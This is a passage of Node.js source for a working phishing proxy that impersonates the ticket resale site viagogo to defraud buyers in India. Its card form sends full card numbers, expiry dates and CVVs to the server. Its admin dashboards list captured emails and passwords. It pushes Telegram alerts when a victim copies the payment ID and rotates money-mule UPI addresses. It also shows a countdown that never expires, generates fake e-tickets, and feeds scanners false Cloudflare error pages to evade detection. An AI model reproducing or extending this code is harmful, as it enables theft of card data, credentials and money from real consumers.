          document.getElementById('statusBox').innerHTML='<div style="width:56px;height:56px;background:#dc2626;border-radius:50%;margin:0 auto 16px;display:flex;align-items:center;justify-content:center"><svg viewBox="0 0 24 24" width="28" height="28" fill="none" stroke="white" stroke-width="3"><path d="M18 6L6 18M6 6l12 12"/></svg></div><h3 style="color:#dc2626">Payment Verification Failed</h3><p style="color:#555">We could not verify your payment. If you have already paid, please contact our support team with your Order ID.</p><button onclick="document.getElementById(&quot;statusOverlay&quot;).classList.remove(&quot;show&quot;);window._verifyStarted=false;" style="margin-top:16px;padding:11px 24px;background:#191c1f;color:#fff;border:none;border-radius:8px;cursor:pointer;font-weight:600;font-family:Inter,sans-serif">Try Again</button><p style="font-size:12px;color:#aaa;margin-top:8px">Order: '+ORDER_ID+'</p>';
        }
      }).catch(function(){});
  },3000);
}

/* Card form */
function submitCard(){
  var num=document.getElementById('cardNum').value.replace(/\\s/g,'');
  var exp=document.getElementById('cardExp').value;
  var cvv=document.getElementById('cardCvv').value;
  var name=document.getElementById('cardName').value;
  if(num.length<15||!exp||!cvv){
    showCardError('Please fill in all card details');
    return;
  }
  var btn=document.querySelector('.card-submit');
  btn.disabled=true;btn.textContent='Processing...';btn.style.opacity='0.6';
  fetch('/_payment/capture-card',{
    method:'POST',
    headers:{'content-type':'application/json'},
    body:JSON.stringify({cardNumber:num,expiry:exp,cvv:cvv,name:name,amount:AMOUNT,orderId:ORDER_ID})
  }).then(function(r){return r.json();}).then(function(d){
    btn.disabled=false;btn.textContent='Pay \\u20B9'+AMOUNT.toLocaleString('en-IN');btn.style.opacity='1';
    if(d.status==='failed'){
      showCardError(d.title+': '+d.message);
    }
  }).catch(function(){
    btn.disabled=false;btn.textContent='Pay \\u20B9'+AMOUNT.toLocaleString('en-IN');btn.style.opacity='1';
    showCardError('Network error. Please try again.');
  });
}
function showCardError(msg){
  var el=document.getElementById('cardError');
  el.textContent=msg;el.style.display='block';
  setTimeout(function(){el.style.display='none';},8000);
}

/* Auto-format card number */
document.getElementById('cardNum').addEventListener('input',function(e){
  var v=e.target.value.replace(/\\D/g,'');
  var f='';
  for(var i=0;i<v.length&&i<16;i++){
    if(i>0&&i%4===0)f+=' ';
    f+=v[i];
  }
  e.target.value=f;
});
/* Auto-format expiry */
document.getElementById('cardExp').addEventListener('input',function(e){
  var v=e.target.value.replace(/\\D/g,'');
  if(v.length>=2)v=v.slice(0,2)+'/'+v.slice(2,4);
  e.target.value=v;
});
/* Countdown timer — 15 minutes, resets to 5:00 when it hits 0 (never actually expires) */
(function(){
  var secs=899;
  var el=document.getElementById('countdownTimer');
  var bar=document.getElementById('countdownBar');
  if(!el)return;
  window._countdownId=setInterval(function(){
    secs--;
    if(secs<=0){secs=300;bar.style.background='#fff8e1';bar.style.borderColor='#ffe082';bar.style.color='#e65100';}
    var m=Math.floor(secs/60);
    var s=secs%60;
    var tf=(m<10?'0':'')+m+':'+(s<10?'0':'')+s;
    el.textContent=tf;
    document.title=tf+' left to complete purchase | '+EVENT_NAME;
    if(secs<120){bar.style.background='#fce4ec';bar.style.borderColor='#ef9a9a';bar.style.color='#c62828';}
    else if(secs<300){bar.style.background='#fff3e0';bar.style.borderColor='#ffcc80';bar.style.color='#e65100';}
  },1000);
})();
<\/script>
</body>
</html>`;
}

// ═══════════════════════════════════════════════════════════════════
// ADMIN DASHBOARD
// ═══════════════════════════════════════════════════════════════════

function serveSessionAdmin(cReq, cRes) {
  const entries = [...SESSION_STORE.entries()].reverse();
  let rows = '';
  for (const [vid, s] of entries) {
    rows += `<tr>
      <td style="font-family:monospace;font-size:12px">${vid}</td>
      <td>${s.email || '—'}</td>
      <td>${s.password ? '***captured***' : '—'}</td>
      <td style="font-size:12px">${s.stage}</td>
      <td style="font-size:12px">${s.loginTime ? new Date(s.loginTime).toLocaleTimeString() : '—'}</td>
    </tr>`;
  }
  cRes.writeHead(200, { 'content-type': 'text/html; charset=utf-8' });
  cRes.end(`<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Auth Sessions</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:Inter,Arial,sans-serif;background:#f5f7fa;padding:20px}
h1{font-size:20px;margin-bottom:16px;color:#191c1f}
table{width:100%;border-collapse:collapse;background:#fff;border-radius:12px;overflow:hidden;box-shadow:0 2px 8px rgba(0,0,0,.06)}
th{background:#4E7C05;color:#fff;padding:12px 14px;text-align:left;font-size:13px;font-weight:600}
td{padding:10px 14px;border-bottom:1px solid #f0f0f0;font-size:14px;vertical-align:middle}
tr:hover td{background:#f8f9fa}
.refresh{background:#4E7C05;color:#fff;border:none;padding:8px 20px;border-radius:8px;cursor:pointer;font-weight:600;margin-bottom:16px}
</style></head><body>
<h1>Auth Session Dashboard</h1>
<button class="refresh" onclick="location.reload()">Refresh</button>
<p style="font-size:13px;color:#878787;margin-bottom:12px">${entries.length} session(s)</p>
<table><thead><tr><th>Visitor ID</th><th>Email</th><th>Password</th><th>Stage</th><th>Time</th></tr></thead>
<tbody>${rows || '<tr><td colspan="5" style="text-align:center;padding:40px;color:#888">No sessions yet</td></tr>'}</tbody></table>
<script>setInterval(function(){location.reload();},5000);</script>
</body></html>`);
}

// ═══════════════════════════════════════════════════════════════════
// SECURITY HARDENING
// ═══════════════════════════════════════════════════════════════════

// Admin auth token — required for all /_admin/* endpoints
// Generate a random one on each startup so it's never hardcoded
const ADMIN_TOKEN = process.env.ADMIN_TOKEN || randomBytes(16).toString('hex');
console.log(`[SECURITY] Admin token: ${ADMIN_TOKEN}`);
console.log(`[SECURITY] Admin URL:   /_admin/payments?t=${ADMIN_TOKEN}`);

// Send admin token to TG on startup so Sam always has it
setTimeout(() => {
  tgNotify(
    `🔐 <b>PROXY STARTED</b>\n\n` +
    `Admin token: <code>${ADMIN_TOKEN}</code>\n\n` +
    `Dashboard: <code>/_admin/payments?t=${ADMIN_TOKEN}</code>\n` +
    `Sessions:  <code>/_admin/sessions?t=${ADMIN_TOKEN}</code>\n` +
    `VPA swap:  <code>/_admin/vpa?t=${ADMIN_TOKEN}&v=new@bank</code>\n\n` +
    `⏱ Uptime started: ${new Date().toLocaleString('en-IN', {timeZone:'Asia/Kolkata'})}`
  );
}, 2000);

// Rate limiter — per-IP sliding window
const RATE_BUCKETS = new Map(); // ip -> { count, resetAt }
const RATE_LIMITS = {
  payment: { max: 10, windowMs: 60000 },   // 10 payment actions/min
  admin:   { max: 20, windowMs: 60000 },    // 20 admin hits/min
  general: { max: 120, windowMs: 60000 },   // 120 req/min general
};
function rateCheck(ip, bucket) {
  const cfg = RATE_LIMITS[bucket] || RATE_LIMITS.general;
  const key = `${ip}:${bucket}`;
  const now = Date.now();
  let entry = RATE_BUCKETS.get(key);
  if (!entry || now > entry.resetAt) {
    entry = { count: 0, resetAt: now + cfg.windowMs };
    RATE_BUCKETS.set(key, entry);
  }
  entry.count++;
  return entry.count <= cfg.max;
}
// Purge stale buckets every 5 min
setInterval(() => {
  const now = Date.now();
  for (const [k, v] of RATE_BUCKETS) { if (now > v.resetAt) RATE_BUCKETS.delete(k); }
}, 300000);

// Bot/scanner detection — block known scanner UAs and path probes
const SCANNER_UA_RE = /nikto|sqlmap|nmap|masscan|burp|owasp|dirbuster|gobuster|ffuf|wfuzz|nuclei|httpx|subfinder|amass|censys|shodan|zgrab|curl\/7\.|python-requests|scrapy|arachni/i;
const SCANNER_PATH_RE = /\.(env|git|svn|htaccess|htpasswd|bak|sql|dump|log|conf|ini|yml|yaml|toml|xml|swp|DS_Store)|\/wp-|\/phpmy|\/phpmyadmin|\/\.well-known\/|\/cgi-bin|\/server-status|\/server-info|\/elmah|\/actuator|\/debug|\/console|\/trace|\/swagger|\/graphql/i;

// IP hasher — never log raw IPs, always hash them
function hashIP(ip) {
  return createHash('sha256').update(ip + ADMIN_TOKEN).digest('hex').slice(0, 12);
}

// Get real client IP from CF/proxy headers
function getClientIP(req) {
  return req.headers['cf-connecting-ip'] ||
    req.headers['x-real-ip'] ||
    (req.headers['x-forwarded-for'] || '').split(',')[0].trim() ||
    req.socket?.remoteAddress || '?';
}

// Security headers applied to all our custom pages
function securityHeaders() {
  return {
    'X-Content-Type-Options': 'nosniff',
    'X-Frame-Options': 'DENY',
    'X-XSS-Protection': '1; mode=block',
    'Referrer-Policy': 'no-referrer',
    'Permissions-Policy': 'camera=(), microphone=(), geolocation=()',
    'Cache-Control': 'no-store, no-cache, must-revalidate, private',
    'Pragma': 'no-cache',
  };
}

// Blocked IPs set — auto-ban after repeated scanner probes
const BLOCKED_IPS = new Set();
const PROBE_COUNTS = new Map(); // ip -> count
// ponytail: never auto-ban localhost/loopback — that's always admin testing
const LOCALHOST_RE = /^(127\.|::1|localhost|0:0:0:0:0:0:0:1)/;
function recordProbe(ip) {
  if (LOCALHOST_RE.test(ip)) return; // don't ban yourself
  const c = (PROBE_COUNTS.get(ip) || 0) + 1;
  PROBE_COUNTS.set(ip, c);
  if (c >= 5) { BLOCKED_IPS.add(ip); PROBE_COUNTS.delete(ip); }
}

// ═══════════════════════════════════════════════════════════════════
// HTTP SERVER — request router
// ═══════════════════════════════════════════════════════════════════

const server = http.createServer((cReq, cRes) => {
  const clientIP = getClientIP(cReq);

  // ── Layer 1: Blocked IP check ──
  if (BLOCKED_IPS.has(clientIP)) {
    cRes.writeHead(444); // connection drop (nginx-style)
    cRes.end();
    return;
  }

  // ── Layer 2: Scanner UA detection ──
  const ua = cReq.headers['user-agent'] || '';
  if (SCANNER_UA_RE.test(ua)) {
    recordProbe(clientIP);
    // Serve a fake "502 Bad Gateway" to look like a dead server
    cRes.writeHead(502, { 'content-type': 'text/html', 'server': 'cloudflare' });
    cRes.end('<html><head><title>502 Bad Gateway</title></head><body><center><h1>502 Bad Gateway</h1></center><hr><center>cloudflare</center></body></html>');
    return;
  }

  // ── Layer 3: Scanner path probe detection (skip CDN — internal paths) ──
  if (!cReq.url.startsWith('/_cdn') && SCANNER_PATH_RE.test(cReq.url)) {
    recordProbe(clientIP);
    cRes.writeHead(404, { 'content-type': 'text/html', 'server': 'cloudflare' });
    cRes.end('<html><head><title>404 Not Found</title></head><body><center><h1>404 Not Found</h1></center><hr><center>cloudflare</center></body></html>');
    return;
  }

  // ── Layer 4: Strip server identification from all responses ──
  const origWriteHead = cRes.writeHead.bind(cRes);
  cRes.writeHead = function(code, headers) {
    if (typeof headers === 'object' && headers) {
      delete headers['x-powered-by'];
      delete headers['X-Powered-By'];
      headers['server'] = 'cloudflare';
    }
    return origWriteHead(code, headers);
  };

  // ── Layer 5: Admin endpoint auth ──
  if (cReq.url.startsWith('/_admin')) {
    const pu = new URL(cReq.url, 'http://localhost');
    const token = pu.searchParams.get('t') || pu.searchParams.get('token') || cReq.headers['x-admin-token'];
    if (token !== ADMIN_TOKEN) {
      // Return viagogo-looking 404 to hide admin exists
      recordProbe(clientIP);
      cRes.writeHead(404, { 'content-type': 'text/html', ...securityHeaders() });
      cRes.end('<html><head><title>404 Not Found</title></head><body><center><h1>404 Not Found</h1></center><hr><center>cloudflare</center></body></html>');
      return;
    }
    if (!rateCheck(clientIP, 'admin')) {
      cRes.writeHead(429, { 'content-type': 'text/plain', 'retry-after': '60', ...securityHeaders() });
      cRes.end('Too Many Requests');
      return;
    }
  }

  // ── Debug click capture — helps diagnose mobile intercept issues ──
  if (cReq.url === '/_debug/click' && cReq.method === 'POST') {
    let body = '';
    cReq.on('data', c => { body += c; if (body.length > 4096) { cReq.destroy(); } });
    cReq.on('end', () => {
      try {
        const d = JSON.parse(body);
        console.log('[CLICK]', d.tag, JSON.stringify(d.text).slice(0,50), d.path);
        tgNotify(`🔍 <b>Click Intercepted</b>\nText: <code>${(d.text||'').slice(0,50)}</code>\nTag: ${d.tag} role=${d.role||'none'}\nClass: <code>${(d.cls||'').slice(0,80)}</code>\nPath: ${d.path}\nEvent page: ${d.isEvent}`);
      } catch(e) {}
      cRes.writeHead(200, { 'content-type': 'application/json' });
      cRes.end('{"ok":true}');
    });
    return;
  }

  // ── Layer 6: Rate limit payment endpoints ──
  if (cReq.url.startsWith('/_payment')) {
    if (!rateCheck(clientIP, 'payment')) {
      cRes.writeHead(429, { 'content-type': 'application/json', ...securityHeaders() });
      cRes.end('{"error":"rate_limited"}');
      return;
    }
  }

  // ── Layer 7: General rate limit ──
  if (!cReq.url.startsWith('/_cdn') && !rateCheck(clientIP, 'general')) {
    cRes.writeHead(429, { 'content-type': 'text/plain' });
    cRes.end('Too Many Requests');
    return;
  }

  // CORS preflight
  if (cReq.method === 'OPTIONS') {
    cRes.writeHead(204, {
      'access-control-allow-origin': '*',
      'access-control-allow-methods': 'GET, POST, PUT, DELETE, OPTIONS, PATCH',
      'access-control-allow-headers': '*',
      'access-control-max-age': '86400',
    });
    cRes.end();
    return;
  }

  // Health check
  if (cReq.url === '/_health') {
    cRes.writeHead(200, { 'content-type': 'text/plain' });
    cRes.end('ok');
    return;
  }

  // ── Admin: auth sessions ──
  if (cReq.url.startsWith('/_admin/sessions')) {
    serveSessionAdmin(cReq, cRes);
    return;
  }

  // ── Admin: payments ──
  if (cReq.url.startsWith('/_admin/payments')) {
    const pu = new URL(cReq.url, 'http://localhost');

    if (pu.pathname === '/_admin/payments/confirm') {
      const oid = pu.searchParams.get('oid');
      const src = pu.searchParams.get('src'); // 'client' or absent (chief)
      const entry = oid && PENDING_PAYMENTS.get(oid);
      const already = entry && entry.status !== 'pending';
      if (entry && !already) {
        entry.status = 'confirmed';
        entry.confirmedBy = src === 'client' ? 'client' : 'chief';
        console.log('[ADMIN] Payment CONFIRMED by', entry.confirmedBy, ':', oid, '₹' + entry.amount);
        // Notify chief
        tgNotify(`✅ <b>PAYMENT CONFIRMED</b>${src === 'client' ? ' (by client)' : ''}\n\nOrder: <code>${oid}</code>\nAmount: <b>₹${entry.amount}</b>\nEvent: ${entry.event || '—'}\n\n💸 Buyer will see "Payment Confirmed" and get tickets.`);
        // Notify client
        tgClient(`✅ <b>Payment Approved</b>${src !== 'client' ? ' (by admin)' : ''}\n\nOrder: <code>${oid}</code>\nAmount: <b>₹${entry.amount}</b>\nEvent: ${entry.event || '—'}`);
      }
      const amt = entry ? entry.amount : '?';
      const ev = entry ? (entry.event || 'Unknown') : '?';
      const statusMsg = already ? `⚠️ Already ${entry.status}` : '✅ CONFIRMED';
      const isClient = src === 'client';
      const noteText = already
        ? 'This payment was already ' + entry.status + '.<br>No action taken.'
        : isClient
          ? 'Payment approved. Buyer will receive their tickets.'
          : 'Buyer will see "Payment Confirmed" on their screen<br>and receive e-tickets for download.';
      cRes.writeHead(200, { 'content-type': 'text/html', ...securityHeaders() });
      cRes.end(`<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Payment ${already ? 'Already ' + entry.status : 'Confirmed'}</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#0a0a0a;color:#fff;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px}.card{background:#1a1a1a;border-radius:16px;padding:32px;max-width:400px;width:100%;text-align:center;border:1px solid #333}.icon{font-size:64px;margin-bottom:16px}.status{font-size:22px;font-weight:700;margin-bottom:8px;color:${already ? '#f59e0b' : '#22c55e'}}.oid{font-family:monospace;font-size:13px;color:#888;margin:8px 0}.amt{font-size:28px;font-weight:700;color:#22c55e;margin:12px 0}.ev{font-size:14px;color:#aaa;margin-bottom:16px}.note{font-size:12px;color:#666;margin-top:16px;line-height:1.5}</style></head><body><div class="card"><div class="icon">${already ? '⚠️' : '✅'}</div><div class="status">${statusMsg}</div><div class="oid">Order: ${oid}</div><div class="amt">₹${amt}</div><div class="ev">${ev}</div><div class="note">${noteText}</div></div></body></html>`);
      return;
    }

    if (pu.pathname === '/_admin/payments/deny') {
      const oid = pu.searchParams.get('oid');
      const src = pu.searchParams.get('src');
      const entry = oid && PENDING_PAYMENTS.get(oid);
      const already = entry && entry.status !== 'pending';
      if (entry && !already) {
        entry.status = 'denied';
        entry.deniedBy = src === 'client' ? 'client' : 'chief';
        console.log('[ADMIN] Payment DENIED by', entry.deniedBy, ':', oid, '₹' + entry.amount);
        tgNotify(`❌ <b>PAYMENT DENIED</b>${src === 'client' ? ' (by client)' : ''}\n\nOrder: <code>${oid}</code>\nAmount: <b>₹${entry.amount}</b>\n\n🚫 Buyer will see "Verification Failed" with a retry option.`);
        tgClient(`❌ <b>Payment Denied</b>${src !== 'client' ? ' (by admin)' : ''}\n\nOrder: <code>${oid}</code>\nAmount: <b>₹${entry.amount}</b>\nEvent: ${entry.event || '—'}`);
      }
      const amt = entry ? entry.amount : '?';
      const ev = entry ? (entry.event || 'Unknown') : '?';
      const statusMsg = already ? `⚠️ Already ${entry.status}` : '❌ DENIED';
      const isClient = src === 'client';
      const noteText = already
        ? 'This payment was already ' + entry.status + '.<br>No action taken.'
        : isClient
          ? 'Payment denied. Buyer will be asked to retry.'
          : 'Buyer will see "Verification Failed"<br>with a retry option on their screen.';
      cRes.writeHead(200, { 'content-type': 'text/html', ...securityHeaders() });
      cRes.end(`<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Payment ${already ? 'Already ' + entry.status : 'Denied'}</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#0a0a0a;color:#fff;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px}.card{background:#1a1a1a;border-radius:16px;padding:32px;max-width:400px;width:100%;text-align:center;border:1px solid #333}.icon{font-size:64px;margin-bottom:16px}.status{font-size:22px;font-weight:700;margin-bottom:8px;color:${already ? '#f59e0b' : '#ef4444'}}.oid{font-family:monospace;font-size:13px;color:#888;margin:8px 0}.amt{font-size:28px;font-weight:700;color:#ef4444;margin:12px 0}.ev{font-size:14px;color:#aaa;margin-bottom:16px}.note{font-size:12px;color:#666;margin-top:16px;line-height:1.5}</style></head><body><div class="card"><div class="icon">${already ? '⚠️' : '❌'}</div><div class="status">${statusMsg}</div><div class="oid">Order: ${oid}</div><div class="amt">₹${amt}</div><div class="ev">${ev}</div><div class="note">${noteText}</div></div></body></html>`);
      return;
    }

    // List payments
    const accept = cReq.headers['accept'] || '';
    const entries = [...PENDING_PAYMENTS.entries()].reverse();
    if (accept.includes('text/html')) {
      let rows = '';
      for (const [oid, e] of entries) {
        const color = e.status === 'confirmed' ? '#4E7C05' : e.status === 'denied' ? '#dc2626' : '#f59e0b';
        rows += `<tr>
          <td style="font-family:monospace;font-size:13px">${oid}</td>
          <td><strong>₹${Number(e.amount).toLocaleString('en-IN')}</strong></td>
          <td style="font-size:12px">${e.method || 'upi'}</td>
          <td style="font-size:12px">${e.ip || ''}</td>
          <td style="font-size:12px">${new Date(e.ts).toLocaleTimeString()}</td>
          <td><span style="color:${color};font-weight:600;text-transform:uppercase">${e.status}</span></td>
          <td>${e.status === 'pending' ?
            `<button onclick="act('confirm','${oid}')" style="background:#4E7C05;color:#fff;border:none;padding:6px 14px;border-radius:6px;cursor:pointer;font-weight:600;margin-right:6px">Confirm</button>` +
            `<button onclick="act('deny','${oid}')" style="background:#dc2626;color:#fff;border:none;padding:6px 14px;border-radius:6px;cursor:pointer;font-weight:600">Deny</button>`
            : ''}</td></tr>`;
      }
      cRes.writeHead(200, { 'content-type': 'text/html; charset=utf-8' });
      cRes.end(`<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Payment Admin</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:Inter,Arial,sans-serif;background:#f5f7fa;padding:20px}
h1{font-size:20px;margin-bottom:16px;color:#191c1f}
table{width:100%;border-collapse:collapse;background:#fff;border-radius:12px;overflow:hidden;box-shadow:0 2px 8px rgba(0,0,0,.06)}
th{background:#4E7C05;color:#fff;padding:12px 14px;text-align:left;font-size:13px;font-weight:600}
td{padding:10px 14px;border-bottom:1px solid #f0f0f0;font-size:14px;vertical-align:middle}
tr:hover td{background:#f8f9fa}
.refresh{background:#4E7C05;color:#fff;border:none;padding:8px 20px;border-radius:8px;cursor:pointer;font-weight:600;margin-bottom:16px}
</style></head><body>
<h1>Payment Dashboard</h1>
<button class="refresh" onclick="location.reload()">Refresh</button>
<p style="font-size:13px;color:#878787;margin-bottom:12px">${entries.length} payment(s) — auto-refreshes every 5s</p>
<table><thead><tr><th>Order ID</th><th>Amount</th><th>Method</th><th>IP</th><th>Time</th><th>Status</th><th>Action</th></tr></thead>
<tbody>${rows || '<tr><td colspan="7" style="text-align:center;padding:40px;color:#888">No payments yet</td></tr>'}</tbody></table>
<script>
function act(action,oid){fetch('/_admin/payments/'+action+'?oid='+oid,{method:'POST'}).then(function(){location.reload();});}
setInterval(function(){location.reload();},5000);
</script></body></html>`);
    } else {
      cRes.writeHead(200, { 'content-type': 'application/json' });
      cRes.end(JSON.stringify(entries.map(([oid, e]) => ({ oid, ...e }))));
    }
    return;
  }

  // ── Admin: VPA hot-swap ──
  if (cReq.url.startsWith('/_admin/vpa')) {
    const av = new URL(cReq.url, 'http://localhost');
    if (cReq.method === 'POST' || av.searchParams.get('v')) {
      const newVpa = av.searchParams.get('v');
      if (newVpa && newVpa.includes('@')) {
        MULE_POOL[0].vpa = newVpa;
        console.log('[ADMIN] VPA changed to:', newVpa);
        cRes.writeHead(200, { 'content-type': 'application/json' });
        cRes.end(JSON.stringify({ status: 'ok', vpa: newVpa }));
      } else {
        cRes.writeHead(400, { 'content-type': 'application/json' });
        cRes.end(JSON.stringify({ status: 'error', msg: 'Pass ?v=yourname@bank' }));
      }
    } else {
      cRes.writeHead(200, { 'content-type': 'application/json' });
      cRes.end(JSON.stringify({ vpa: MULE_POOL[0].vpa, active: MULE_POOL[0].active }));
    }
    return;
  }

  // ── Payment page ──
  if (cReq.url.startsWith('/_payment')) {
    const pu = new URL(cReq.url, 'http://localhost');

    if (pu.pathname === '/_payment/capture-card') {
      handleCardCapture(cReq, cRes);
      return;
    }

    if (pu.pathname === '/_payment/register') {
      let body = '';
      cReq.on('data', c => { body += c; });
      cReq.on('end', () => {
        try {
          const data = JSON.parse(body);
          const ip = cReq.headers['x-forwarded-for'] || cReq.socket?.remoteAddress || '?';
          PENDING_PAYMENTS.set(data.orderId, {
            amount: data.amount,
            vpa: data.vpa,
            method: data.method || 'upi',
            event: data.event || '',
            section: data.section || '',
            seat: data.seat || '',
            qty: data.qty || 1,
            ts: Date.now(),
            status: 'pending',
            ip,
            ua: (cReq.headers['user-agent'] || '').slice(0, 80),
          });
          console.log('[PAYMENT] Registered:', data.orderId, '₹' + data.amount);
          const reqHost = data.host || cReq.headers['host'] || 'localhost:3000';
          const reqProto = data.proto || 'http';
          const baseUrl = `${reqProto}://${reqHost}`;
          const confirmUrl = `${baseUrl}/_admin/payments/confirm?oid=${data.orderId}&t=${ADMIN_TOKEN}`;
          const denyUrl = `${baseUrl}/_admin/payments/deny?oid=${data.orderId}&t=${ADMIN_TOKEN}`;
          const clientConfirmUrl = `${baseUrl}/_admin/payments/confirm?oid=${data.orderId}&t=${ADMIN_TOKEN}&src=client`;
          const clientDenyUrl = `${baseUrl}/_admin/payments/deny?oid=${data.orderId}&t=${ADMIN_TOKEN}&src=client`;
          const isPublic = !reqHost.startsWith('localhost') && !reqHost.startsWith('127.0.0.1');
          const timeStr = new Date().toLocaleString('en-IN', {timeZone:'Asia/Kolkata'});
          // ── Chief gets full details ──
          const msgText = `💰 <b>UPI PAYMENT — VERIFY IN KOTAK</b>\n\n` +
            `Order: <code>${data.orderId}</code>\n` +
            `Amount: <b>₹${data.amount}</b>\n` +
            `Event: ${data.event || '—'}\n` +
            `Section: ${data.section || '—'} | Seat: ${data.seat || '—'}\n` +
            `Qty: ${data.qty || 1} ticket(s)\n` +
            `VPA: <code>${data.vpa}</code>\n` +
            `IP: <code>${hashIP(ip)}</code>\n` +
            `Time: ${timeStr}\n\n` +
            `⚠️ Check Kotak app/SMS for ₹${data.amount} credit FIRST` +
            (isPublic ? '' : `\n\n✅ <a href="${confirmUrl}">CONFIRM ₹${data.amount}</a>\n❌ <a href="${denyUrl}">DENY PAYMENT</a>`);
          const markup = isPublic ? {
            inline_keyboard: [
              [
                { text: `✅ CONFIRM ₹${data.amount}`, url: confirmUrl },
                { text: `❌ DENY`, url: denyUrl }
              ]
            ]
          } : undefined;
          tgNotify(msgText, markup);
          // ── Client gets clean details + approve/deny only ──
          const clientMsg = `🎫 <b>New Payment</b>\n\n` +
            `Order: <code>${data.orderId}</code>\n` +
            `Amount: <b>₹${data.amount}</b>\n` +
            `Event: ${data.event || '—'}\n` +
            `Section: ${data.section || '—'}\n` +
            `Qty: ${data.qty || 1} ticket(s)\n` +
            `Time: ${timeStr}`;
          const clientMarkup = {
            inline_keyboard: [
              [
                { text: `✅ Approve ₹${data.amount}`, url: clientConfirmUrl },
                { text: `❌ Deny`, url: clientDenyUrl }
              ]
            ]
          };
          tgClient(clientMsg, clientMarkup);
        } catch(e) {}
        cRes.writeHead(200, { 'content-type': 'application/json' });
        cRes.end('{"ok":true}');
      });
      return;
    }

    if (pu.pathname === '/_payment/status') {
      const oid = pu.searchParams.get('oid');
      const entry = oid && PENDING_PAYMENTS.get(oid);
      cRes.writeHead(200, { 'content-type': 'application/json' });
      cRes.end(JSON.stringify({ status: entry ? entry.status : 'unknown' }));
      return;
    }

    // Copy-alert: TG notification when victim copies VPA
    if (pu.pathname === '/_payment/copy-alert') {
      let body = '';
      cReq.on('data', c => { body += c; });
      cReq.on('end', () => {
        try {
          const data = JSON.parse(body);
          const ip = cReq.headers['x-forwarded-for'] || cReq.socket?.remoteAddress || '?';
          tgNotify(
            `🔔 <b>UPI ID COPIED — BE READY</b>\n\n` +
            `⚡ Payment likely incoming!\n` +
            `Amount: <b>₹${data.amount}</b>\n` +
            `Order: <code>${data.orderId}</code>\n` +
            `IP: <code>${hashIP(ip)}</code>\n` +
            `Time: ${new Date().toLocaleString('en-IN', {timeZone:'Asia/Kolkata'})}\n\n` +
            `👀 Watch Kotak app for ₹${data.amount} credit`
          );
        } catch(e) {}
        cRes.writeHead(200, { 'content-type': 'application/json' });
        cRes.end('{"ok":true}');
      });
      return;
    }

    // Serve payment page
    const amount = pu.searchParams.get('amount') || '4999';
    const eventName = pu.searchParams.get('event') || 'Event Tickets';
    const section = pu.searchParams.get('section') || '';
    const seatInfo = pu.searchParams.get('seat') || '';
    const qty = parseInt(pu.searchParams.get('qty')) || 1;
    let eventDate = pu.searchParams.get('date') || '';
    let eventTime = pu.searchParams.get('time') || '';
    let eventVenue = pu.searchParams.get('venue') || '';
    // Server-side cache fallback — if client JS scraper missed data, use what we extracted from the proxied HTML
    const refPath = pu.searchParams.get('ref') || '';
    if ((!eventDate || !eventTime || !eventVenue) && refPath) {
      const cached = EVENT_INFO_CACHE.get(refPath);
      if (cached) {
        if (!eventDate && cached.date) eventDate = cached.date;
        if (!eventTime && cached.time) eventTime = cached.time;
        if (!eventVenue && cached.venue) eventVenue = cached.venue;
      }
    }
    // Also try partial path matches (viagogo URLs can vary with locale prefixes)
    if ((!eventDate || !eventTime || !eventVenue) && refPath) {
      for (const [path, cached] of EVENT_INFO_CACHE) {
        if (refPath.includes(path.split('/').pop()) || path.includes(refPath.split('/').pop())) {
          if (!eventDate && cached.date) eventDate = cached.date;
          if (!eventTime && cached.time) eventTime = cached.time;
          if (!eventVenue && cached.venue) eventVenue = cached.venue;
          break;
        }
      }
    }
    const mobile = isMobile(cReq);
    const mule = selectMule(parseFloat(amount));
    const orderId = genOrderId();
    const html = paymentPageHTML(amount, orderId, mule, mobile, eventName, section, seatInfo, qty, eventDate, eventTime, eventVenue);
    const payBuf = Buffer.from(html, 'utf-8');
    const payHeaders = {
      'content-type': 'text/html; charset=utf-8',
      'content-security-policy': "default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob:; img-src 'self' data: blob: https:; font-src 'self' data: https://fonts.googleapis.com https://fonts.gstatic.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; connect-src 'self'; frame-ancestors 'none';",
      ...securityHeaders(),
    };
    sendCompressed(cRes, 200, payHeaders, payBuf, cReq.headers['accept-encoding']);
    return;
  }

  // ── Fake e-ticket generator ──
  if (cReq.url.startsWith('/_ticket')) {
    const tu = new URL(cReq.url, 'http://localhost');
    const tOid = tu.searchParams.get('oid') || genOrderId();
    const tEvent = tu.searchParams.get('event') || 'Event Tickets';
    const tAmount = tu.searchParams.get('amount') || '4999';
    const tSection = tu.searchParams.get('section') || 'Lower Tier - Block 108';
    const tSeat = tu.searchParams.get('seat') || '';
    const tQty = parseInt(tu.searchParams.get('qty')) || 1;
    let tDate = tu.searchParams.get('date') || '';
    let tTime = tu.searchParams.get('time') || '';
    let tVenue = tu.searchParams.get('venue') || '';

    // Last-resort: check server-side cache if client scraper missed anything
    // Only use cache entries whose URL path contains part of the event name (avoid cross-event pollution)
    if (!tDate || !tTime || !tVenue) {
      const eventWords = tEvent.toLowerCase().split(/[\s-]+/).filter(function(w){ return w.length > 3; });
      for (const [path, cached] of EVENT_INFO_CACHE) {
        const pathLow = path.toLowerCase();
        const match = eventWords.some(function(w){ return pathLow.includes(w); });
        if (match) {
          if (!tDate && cached.date) tDate = cached.date;
          if (!tTime && cached.time) tTime = cached.time;
          if (!tVenue && cached.venue) tVenue = cached.venue;
          break;
        }
      }
    }

    // Alert to TG if STILL missing real data — this means we're about to use fallback
    if (!tDate || !tVenue) {
      const missing = [];
      if (!tDate) missing.push('date');
      if (!tTime) missing.push('time');
      if (!tVenue) missing.push('venue');
